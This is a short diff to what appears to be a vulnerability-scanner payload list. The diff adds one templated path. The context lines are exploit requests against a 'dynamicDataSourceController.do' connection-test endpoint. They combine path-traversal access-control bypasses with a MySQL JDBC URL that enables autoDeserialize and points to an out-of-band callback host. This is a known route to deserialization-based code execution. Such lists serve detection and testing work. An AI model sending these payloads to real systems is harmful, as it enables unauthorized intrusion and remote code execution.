@@ -5,3 +5,4 @@
 /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
 //api/..;/dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
 /api/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
+/{{interface}}
